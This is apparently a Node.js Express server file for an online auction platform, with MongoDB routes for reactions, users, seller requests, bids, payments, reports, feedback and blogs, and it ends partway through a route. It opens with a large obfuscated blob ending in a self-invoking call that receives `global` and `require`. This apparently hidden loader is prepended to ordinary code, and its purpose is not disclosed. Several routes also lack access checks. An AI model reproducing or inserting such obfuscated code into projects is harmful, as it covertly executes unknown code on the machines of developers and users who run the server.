3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
    // Create index for faster queries and to ensure one reaction per user per auction
    await reactionsCollection.createIndex(
      { auctionId: 1, userId: 1 },
      { unique: true }
    );

    // POST: Add or update a reaction
    app.post("/auction-reaction", async (req, res) => {
      try {
        const { auctionId, userId, reactionType } = req.body;

        if (!auctionId || !userId) {
          return res.status(400).send({
            success: false,
            message:
              "Missing required fields: auctionId and userId are required",
          });
        }

        // Check if user already has a reaction for this auction
        const existingReaction = await reactionsCollection.findOne({
          auctionId,
          userId,
        });

        if (existingReaction) {
          // If reactionType is null, remove the reaction
          if (reactionType === null) {
            const result = await reactionsCollection.deleteOne({
              auctionId,
              userId,
            });
            return res.send({
              success: true,
              message: "Reaction removed",
              result,
            });
          }

          // Update existing reaction
          const result = await reactionsCollection.updateOne(
            { auctionId, userId },
            { $set: { reactionType, updatedAt: new Date() } }
          );

          return res.send({
            success: true,
            message: "Reaction updated",
            result,
          });
        } else {
          // If reactionType is null, no need to create a new document
          if (reactionType === null) {
            return res.send({
              success: true,
              message: "No reaction to remove",
            });
          }

          // Create new reaction
          const result = await reactionsCollection.insertOne({
            auctionId,
            userId,
            reactionType,
            createdAt: new Date(),
          });

          return res.send({
            success: true,
            message: "Reaction added",
            result,
          });
        }
      } catch (error) {
        console.error("Error handling reaction:", error);

        // Handle duplicate key error (user trying to add multiple reactions)
        if (error.code === 11000) {
          return res.status(409).send({
            success: false,
            message: "You already reacted to this auction",
          });
        }

        res.status(500).send({
          success: false,
          message: "Failed to process reaction",
          error: error.message,
        });
      }
    });

    // GET: Retrieve reactions for an auction
    app.get("/auction-reactions/:auctionId", async (req, res) => {
      try {
        const { auctionId } = req.params;
        const { userId } = req.query;

        // Get all reactions for this auction
        const reactions = await reactionsCollection
          .find({ auctionId })
          .toArray();

        // Count reactions by type
        const reactionCounts = {
          likes: reactions.filter((r) => r.reactionType === "likes").length,
          loves: reactions.filter((r) => r.reactionType === "loves").length,
          smiles: reactions.filter((r) => r.reactionType === "smiles").length,
          wows: reactions.filter((r) => r.reactionType === "wows").length,
          flags: reactions.filter((r) => r.reactionType === "flags").length,
        };

        // If userId is provided, get the user's reaction
        let userReactions = [];
        if (userId) {
          const userReaction = reactions.find((r) => r.userId === userId);
          if (userReaction) {
            userReactions.push(userReaction);
          }
        }

        res.send({
          success: true,
          reactionCounts,
          totalReactions: reactions.length,
          userReactions,
        });
      } catch (error) {
        console.error("Error fetching reactions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch reactions",
          error: error.message,
        });
      }
    });

    // GET: Get reaction statistics for all auctions
    app.get("/auction-reactions-stats", async (req, res) => {
      try {
        // Aggregate to get total reactions by type
        const stats = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$reactionType",
                count: { $sum: 1 },
              },
            },
          ])
          .toArray();

        // Format the results
        const formattedStats = stats.reduce((acc, stat) => {
          acc[stat._id] = stat.count;
          return acc;
        }, {});

        // Get total auctions with reactions
        const auctionsWithReactions = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$auctionId",
              },
            },
            {
              $count: "total",
            },
          ])
          .toArray();

        res.send({
          success: true,
          stats: formattedStats,
          totalAuctionsWithReactions: auctionsWithReactions[0]?.total || 0,
        });
      } catch (error) {
        console.error("Error fetching reaction stats:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch reaction statistics",
          error: error.message,
        });
      }
    });

    // GET: Get most reacted auctions
    app.get("/most-reacted-auctions", async (req, res) => {
      try {
        const { limit = 5 } = req.query;

        // Aggregate to get auctions with most reactions
        const mostReactedAuctions = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$auctionId",
                totalReactions: { $sum: 1 },
                reactionTypes: {
                  $push: "$reactionType",
                },
              },
            },
            {
              $sort: { totalReactions: -1 },
            },
            {
              $limit: parseInt(limit),
            },
          ])
          .toArray();

        // For each auction, count reaction types
        const result = mostReactedAuctions.map((auction) => {
          const reactionCounts = auction.reactionTypes.reduce((acc, type) => {
            acc[type] = (acc[type] || 0) + 1;
            return acc;
          }, {});

          return {
            auctionId: auction._id,
            totalReactions: auction.totalReactions,
            reactionCounts,
          };
        });

        res.send({
          success: true,
          mostReactedAuctions: result,
        });
      } catch (error) {
        console.error("Error fetching most reacted auctions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch most reacted auctions",
          error: error.message,
        });
      }
    });

    // DELETE: Remove all reactions for an auction (admin only)
    app.delete("/auction-reactions/:auctionId", async (req, res) => {
      try {
        const { auctionId } = req.params;

        // In a real app, you would verify admin permissions here
        // if (!isAdmin(req.user)) {
        //   return res.status(403).send({ success: false, message: "Unauthorized" });
        // }

        const result = await reactionsCollection.deleteMany({ auctionId });

        res.send({
          success: true,
          message: `Deleted ${result.deletedCount} reactions for auction ${auctionId}`,
          result,
        });
      } catch (error) {
        console.error("Error deleting reactions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to delete reactions",
          error: error.message,
        });
      }
    });

    // JWT Routes
    app.post("/jwt", async (req, res) => {
      const user = req.body;
      const token = jwt.sign(user, process.env.ACCESS_TOKEN, {
        expiresIn: "1d",
      });
      res
        .cookie("token", token, { httpOnly: true, secure: false })
        .send({ success: true });
    });

    app.post("/logout", (req, res) => {
      res
        .clearCookie("token", { httpOnly: true, secure: false })
        .send({ success: true });
    });

    // Seller Request APIs
    app.get("/sellerRequest/:becomeSellerStatus", async (req, res) => {
      try {
        const becomeSellerStatus = req.params.becomeSellerStatus;
        const users = await SellerRequestCollection.find({
          becomeSellerStatus,
        }).toArray();
        if (!users.length)
          return res.status(404).json({ message: "Users not found" });
        res.json(users);
      } catch (error) {
        console.error("Error fetching seller requests:", error);
        res.status(500).json({ message: "Internal server error!" });
      }
    });

    app.get("/sellerRequest", async (req, res) => {
      try {
        const users = await SellerRequestCollection.find().toArray();
        res.send(users);
      } catch (error) {
        res.status(500).send("Internal server error!");
      }
    });

    app.post("/become_seller", async (req, res) => {
      const requestData = req.body;
      const result = await SellerRequestCollection.insertOne(requestData);
      res.send({ success: true, result });
    });

    app.delete("/sellerRequest/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await SellerRequestCollection.deleteOne(query);
      if (result.deletedCount > 0) {
        res.send({
          success: true,
          message: "Seller request deleted successfully!",
        });
      } else {
        res
          .status(404)
          .send({ success: false, message: "Seller request not found!" });
      }
    });

    app.patch("/sellerRequest/:id", async (req, res) => {
      const userId = req.params.id;
      const { becomeSellerStatus } = req.body;
      if (!becomeSellerStatus) {
        return res
          .status(400)
          .send({ success: false, message: "Status is required!" });
      }
      const updatedUser = await SellerRequestCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { becomeSellerStatus } }
      );
      if (updatedUser.modifiedCount > 0) {
        res.send({
          success: true,
          message: "Seller status updated successfully!",
        });
      } else {
        res
          .status(404)
          .send({ success: false, message: "Seller request not found!" });
      }
    });

    // User APIs
    app.get("/users", async (req, res) => {
      const users = await userCollection.find().toArray();
      res.send(users);
    });

    app.get("/bid-history/:email", async (req, res) => {
      try {
        const { email } = req.params;
        const user = await userCollection.findOne({ email });

        if (!user?.recentActivity || user.recentActivity.length === 0) {
          return res.status(200).json([]);
        }

        const auctIDs = user.recentActivity.map(
          (item) => new ObjectId(item.auctionId)
        );

        const auctions = await auctionCollection
          .find({ _id: { $in: auctIDs } })
          .toArray();

        const now = new Date();

        const bidHistory = auctions.map((auction) => {
          const endTime = new Date(auction.endTime);
          const bids = auction.bids || [];

          const recentActivity = user.recentActivity.find(
            (activity) =>
              activity.auctionId.toString() === auction._id.toString()
          );

          const recentBidAmount = recentActivity?.amount || 0;
          const bidTime = recentActivity?.time || "N/A";

          const userBids = bids.filter((bid) => bid.email === email);
          const highestUserBid = Math.max(
            recentBidAmount,
            ...userBids.map((bid) => bid.amount)
          );

          const sortedTopBidders = [...(auction.topBidders || [])].sort(
            (a, b) => b.amount - a.amount
          );

          let userPosition = "N/A";
          if (highestUserBid > 0) {
            const uniqueAmounts = [
              ...new Set(sortedTopBidders.map((bidder) => bidder.amount)),
            ];
            const positionIndex = uniqueAmounts.indexOf(highestUserBid);
            if (positionIndex !== -1) {
              userPosition = positionIndex + 1;
            }
          }

          return {
            auctionId: auction._id,
            auctionTitle: auction.name,
            auctionImage: auction.images?.[0] || "",
            bidAmount: highestUserBid,
            time: bidTime,
            status: endTime < now ? "End" : "Live",
            position: userPosition,
            topBiddersLength: sortedTopBidders.length,
          };
        });

        res.status(200).json(bidHistory);
      } catch (error) {
        console.error("Error fetching bid history:", error);
        res.status(500).json({ error: "Internal server error" });
      }
    });

    app.get("/user/:email", async (req, res) => {
      try {
        const email = req.params.email;
        const user = await userCollection.findOne({ email });
        if (!user) return res.status(404).json({ message: "User not found" });
        res.json(user);
      } catch (error) {
        console.error("Error fetching user:", error);
        res.status(500).json({ message: "Internal server error!" });
      }
    });

    app.post("/users", async (req, res) => {
      const user = req.body;
      const query = { email: user.email };
      const existingUser = await userCollection.findOne(query);
      if (existingUser) return res.status(201).send(existingUser);
      const result = await userCollection.insertOne(user);
      res.status(201).send(result);
    });

    app.patch("/users/:id", async (req, res) => {
      const userId = req.params.id;
      const { role } = req.body;
      if (!role) {
        return res
          .status(400)
          .send({ success: false, message: "Role is required!" });
      }
      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { role } }
      );
      if (updatedUser.modifiedCount > 0) {
        res.send({ success: true, message: "User role updated successfully!" });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or role not changed!",
        });
      }
    });

    app.delete("/users/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await userCollection.deleteOne(query);
      if (result.deletedCount > 0) {
        res.send({ success: true, message: "User deleted successfully!" });
      } else {
        res.status(404).send({ success: false, message: "User not found!" });
      }
    });

    // Announcement APIs
    app.get("/announcement", async (req, res) => {
      const result = await announcementCollection.find().toArray();
      res.send(result);
    });

    app.post("/announcement", async (req, res) => {
      const announcementData = req.body;
      const result = await announcementCollection.insertOne(announcementData);
      res.send({ success: true, result });
    });

    app.delete("/announcement/:id", async (req, res) => {
      const id = req.params.id;
      const filter = { _id: new ObjectId(id) };
      const result = await announcementCollection.deleteOne(filter);
      res.send(result);
    });

    app.put("/announcement/:id", async (req, res) => {
      const { title, content, date, image } = req.body;
      const announcementId = req.params.id;
      try {
        const result = await announcementCollection.updateOne(
          { _id: new ObjectId(announcementId) },
          { $set: { title, content, date, image } }
        );
        if (result.matchedCount === 0) {
          return res.status(404).json({ message: "Announcement not found" });
        }
        res.status(200).json({ message: "Announcement updated successfully" });
      } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Failed to update the announcement" });
      }
    });

    // Auction APIs
    app.get("/auction/:id", async (req, res) => {
      const { id } = req.params;
      try {
        const query = { _id: new ObjectId(id) };
        const result = await auctionCollection.findOne(query);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch Auction", error });
      }
    });

    app.get("/auctions", async (req, res) => {
      try {
        const { email } = req.query;
        if (email) {
          const auctions = await auctionCollection
            .find({ sellerEmail: email })
            .toArray();
          res.send(auctions);
        } else {
          const result = await auctionCollection.find().toArray();
          res.send(result);
        }
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    //Upcoming Auction
    app.get("/upcoming-auctions", async (req, res) => {
      try {
        const result = await auctionCollection.find().toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    app.post("/auctions", async (req, res) => {
      const auction = req.body;
      const result = await auctionCollection.insertOne(auction);
      res.send(result);
    });
    app.patch("/auctions/payment/:id", async (req, res) => {
      try {
        const { id } = req.params;
        const { payment, paymentDetails } = req.body;

        if (!payment) {
          return res.status(400).send({
            success: false,
            message: "Payment status is required",
          });
        }

        const filter = { _id: new ObjectId(id) };
        const updateDoc = {
          $set: {
            payment,
            paymentDetails,
            paymentDate: new Date(),
          },
        };

        const result = await auctionCollection.updateOne(filter, updateDoc);

        if (result.matchedCount === 0) {
          return res.status(404).send({
            success: false,
            message: "Auction not found",
          });
        }

        res.send({
          success: true,
          message: "Payment status updated successfully",
          result,
        });
      } catch (error) {
        console.error("Error updating payment status:", error);
        res.status(500).send({
          success: false,
          message: "Failed to update payment status",
          error: error.message,
        });
      }
    });
    app.patch("/auctions/:id", async (req, res) => {
      const auctionId = req.params.id;
      const { status, deliveryStatus, notes } = req.body;

      const filter = { _id: new ObjectId(auctionId) };
      const updateFields = {};

      if (status) updateFields.status = status;
      if (deliveryStatus) updateFields.deliveryStatus = deliveryStatus;
      if (notes) updateFields.notes = notes;

      const updateDoc = { $set: updateFields };

      try {
        const result = await auctionCollection.updateOne(filter, updateDoc);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Update failed", error });
      }
    });

    app.delete("/auctions/:id", async (req, res) => {
      try {
        const id = req.params.id;
        const filter = { _id: new ObjectId(id) };
        const result = await auctionCollection.deleteOne(filter);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    //ended auctions api
    app.get("/endedAuctions", async (req, res) => {
      try {
        const result = await endedAuctionCollection.find().toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    app.post("/endedAuctions", async (req, res) => {
      try {
        const { auctionId } = req.body;
        const query = { _id: new ObjectId(auctionId) };

        // 1. Find the auction
        const auction = await auctionCollection.findOne(query);
        if (!auction) {
          return res.status(404).send({ message: "Auction not found" });
        }

        // 2. Delete it from current auctions
        await auctionCollection.deleteOne(query);

        // 3. Insert into endedAuctionCollection
        const insertResult = await endedAuctionCollection.insertOne(auction);

        res.send({ message: "Auction ended successfully", data: insertResult });
      } catch (error) {
        res.status(500).send({ message: "Internal server error", error });
      }
    });

    //auction er top bidders update

    app.patch("/auctionList/topBidders", async (req, res) => {
      try {
        const { topBidders } = req.body;

        if (
          !topBidders ||
          !Array.isArray(topBidders) ||
          topBidders.length === 0
        ) {
          return res
            .status(400)
            .send({ success: false, message: "Invalid topBidders data." });
        }

        const auctionId = topBidders[0]?.auctionId;

        if (!auctionId) {
          return res.status(400).send({
            success: false,
            message: "auctionId missing in topBidders.",
          });
        }

        const filter = { _id: new ObjectId(auctionId) };
        const updateDoc = {
          $set: {
            topBidders: topBidders,
          },
        };

        const result = await auctionCollection.updateOne(filter, updateDoc);

        res.send({
          success: true,
          message: "Top bidders updated successfully.",
          result,
        });
      } catch (error) {
        console.error("Error updating topBidders:", error);
        res.status(500).send({ success: false, message: "Server error." });
      }
    });

    // Specific user.accountBalance update
    app.patch("/accountBalance/:id", async (req, res) => {
      const userId = req.params.id;
      const { accountBalance, transaction } = req.body;

      if (!accountBalance && !transaction) {
        return res
          .status(400)
          .send({ success: false, message: "accountBalance is required!" });
      }

      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { accountBalance }, $push: { transactions: transaction } }
      );

      if (updatedUser.modifiedCount > 0) {
        res.send({
          success: true,
          message: "User accountBalance updated successfully!",
        });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or accountBalance not changed!",
        });
      }
    });

    // Specific user.recentActivity  update
    app.patch("/updateUserRecentActivity/:id", async (req, res) => {
      const userId = req.params.id;
      const { bidData } = req.body;

      if (!bidData) {
        return res
          .status(400)
          .send({ success: false, message: "valid data is required!" });
      }

      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $push: { recentActivity: bidData } }
      );

      if (updatedUser.modifiedCount > 0) {
        res.status(201).send({
          success: true,
          message: "User data updated successfully!",
        });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or data not changed!",
        });
      }
    });

    // Live Bidding APIs
    app.get("/live-bid/top", async (req, res) => {
      const { auctionId } = req.query;
      const query = auctionId ? { auctionId } : {};
      const result = await SpecificUserLiveBiddingCollection.aggregate([
        { $match: query },
        {
          $group: {
            _id: "$email",
            name: { $first: "$name" },
            photo: { $first: "$photo" },
            amount: { $max: "$amount" },
            auctionId: { $first: "$auctionId" },
          },
        },
        { $sort: { amount: -1 } },
        { $limit: 3 },
      ]).toArray();
      res.send(result);
    });

    app.get("/live-bid/recent", async (req, res) => {
      const { auctionId } = req.query;
      const query = auctionId ? { auctionId } : {};
      const result = await SpecificUserLiveBiddingCollection.find(query)
        .sort({ createdAt: -1 })
        .limit(3)
        .toArray();
      res.send(result);
    });

    app.post("/live-bid", async (req, res) => {
      const liveBid = req.body;
      liveBid.createdAt = new Date();
      const result = await SpecificUserLiveBiddingCollection.insertOne(liveBid);
      await auctionCollection.updateOne(
        { _id: new ObjectId(liveBid.auctionId) },
        { $set: { currentBid: liveBid.amount } }
      );
      res.send(result);
    });

    // Reports API
    app.post("/reports", async (req, res) => {
      try {
        const reports = req.body;
        const result = await reportsCollection.insertOne(reports);
        res.send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // GET a report(Joyeta)
    app.get("/reports", async (req, res) => {
      try {
        const reports = await reportCollection.find().toArray();
        res.send(reports);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to fetch reports", error: error.message });
      }
    });

    // POST a report (Joyeta)
    app.post("/reports", async (req, res) => {
      try {
        const report = req.body;

        if (!report || Object.keys(report).length === 0) {
          return res.status(400).send({ message: "Report data is required" });
        }

        const result = await reportCollection.insertOne(report);
        res.send(result);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to submit report", error: error.message });
      }
    });

    //feedback get method

    app.get("/feedbacks", async (req, res) => {
      try {
        const feedbacks = await feedbackCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    //feedback post api

    app.post("/feedback", async (req, res) => {
      try {
        const feedback = req.body;
        if (!feedback) {
          return res.status(400).send({ message: "Feedback data is required" });
        }
        const result = await feedbackCollection.insertOne(feedback);
        res.status(200).send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    // POST a report (Joyeta)
    app.post("/reports", async (req, res) => {
      try {
        const report = req.body;

        if (!report || Object.keys(report).length === 0) {
          return res.status(400).send({ message: "Report data is required" });
        }

        const result = await reportCollection.insertOne(report);
        res.send(result);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to submit report", error: error.message });
      }
    });

    //feedback get method

    app.get("/feedbacks", async (req, res) => {
      try {
        const feedbacks = await feedbackCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    //feedback post api

    app.post("/feedback", async (req, res) => {
      try {
        const feedback = req.body;
        if (!feedback) {
          return res.status(400).send({ message: "Feedback data is required" });
        }
        const result = await feedbackCollection.insertOne(feedback);
        res.status(200).send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // cover collection api
    // app.post("/cover", async (req, res) => {
    //   const feedback = req.body;

    //   const result = await CoverCollection.insertOne(feedback);
    //   res.status(200).send({ success: true, result });
    // });

    app.patch("/cover", async (req, res) => {
      const userId = req.params.id;
      const { cover } = req.body;
      const filter = { _id: new ObjectId(userId) };
      const updateDoc = { $set: { cover: cover } };
      const result = await userCollection.updateOne(filter, updateDoc);
      res.send(result);
    });
    // Update user profile
    app.patch("/user/:email", async (req, res) => {
      const email = req.params.email;
      const updates = req.body;
      // List of allowed fields to update
      const allowedFields = [
        "name",
        "email",
        "photo",
        "role",
        "AuctionsWon",
        "ActiveBids",
        "TotalSpent",
        "accountBalance",
        "BiddingHistory",
        "onGoingBid",
        "Location",
        "memberSince",
        "recentActivity",
        "watchingNow",
      ];

      // Filter updates to only include allowed fields
      const filteredUpdates = Object.keys(updates)
        .filter((key) => allowedFields.includes(key))
        .reduce((obj, key) => {
          obj[key] = updates[key];
          return obj;
        }, {});

      const filter = { email: email };
      const updateDoc = { $set: filteredUpdates };

      try {
        const result = await userCollection.updateOne(filter, updateDoc);
        if (result.matchedCount === 0) {
          return res.status(404).send({ message: "User not found" });
        }
        const updatedUser = await userCollection.findOne(filter);
        res.send(updatedUser);
      } catch (err) {
        res.status(500).send({ message: "Failed to update profile" });
      }
    });

    // Update cover photo
    app.patch("/cover/:id", async (req, res) => {
      const userId = req.params.id;
      const { cover } = req.body;
      const filter = { _id: new ObjectId(userId) };
      const updateDoc = { $set: { cover: cover } };
      try {
        const result = await userCollection.updateOne(filter, updateDoc);
        if (result.matchedCount === 0) {
          return res.status(404).send({ message: "User not found" });
        }
        const updatedUser = await userCollection.findOne(filter);
        res.send(updatedUser);
      } catch (err) {
        res.status(500).send({ message: "Failed to update cover" });
      }
    });

    // Upload photo
    app.post("/upload-photo", upload.single("photo"), async (req, res) => {
      try {
        const photo = req.file;
        if (!photo) {
          return res.status(400).send({ message: "No photo uploaded" });
        }
        // Upload to Cloudinary
        const uploadResult = await new Promise((resolve, reject) => {
          cloudinary.uploader
            .upload_stream({ resource_type: "image" }, (error, result) => {
              if (error) reject(error);
              else resolve(result);
            })
            .end(photo.buffer);
        });
        res.send({ url: uploadResult.secure_url });
      } catch (err) {
        res.status(500).send({ message: "Failed to upload photo" });
      }
    });

    app.get("/cover", async (req, res) => {
      try {
        const feedbacks = await CoverCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // app.get("/cover/:userId", async (req, res) => {
    //   try {
    //     const userId = req.query.userId; // Get userId from query parameters
    //     const query = { userId: userId };

    //     const result = await CoverCollection.findOne(query);
    //     if (result) {
    //       res.status(200).send(result);
    //     } else {
    //       res.status(404).send({ message: "Cover not found" });
    //     }
    //   } catch (error) {
    //     res.status(500).send({ message: "Internal server error", error });
    //   }
    // });
    // Debug endpoint to check active socket connections
    app.get("/debug/socket-connections", (req, res) => {
      const connections = Array.from(io.sockets.sockets).map(
        ([id, socket]) => ({
          id,
          rooms: Array.from(socket.rooms),
        })
      );

      res.json({
        activeConnections: connections.length,
        connections,
      });
    });

    app.get("/allBlogs", async (req, res) => {
      try {
        const blogs = await blogCollection.find().toArray(); // Adjust to your actual schema or data retrieval method

        if (!blogs || blogs.length === 0) {
          return res
            .status(404)
            .json({ message: "No blogs found for this email." });
        }

        res.status(200).json(blogs); // Respond with the blogs
      } catch (error) {
        console.error(error);
        res
          .status(500)
          .json({ message: "Server error, please try again later." });
      }
    });

    app.get("/blogs/:email", async (req, res) => {
      const email = req.params.email; // Extract email parameter from URL

      try {
        const query = { authorEmail: email };
        const blogs = await blogCollection.find(query).toArray(); // Adjust to your actual schema or data retrieval method

        if (!blogs || blogs.length === 0) {
          return res
            .status(404)
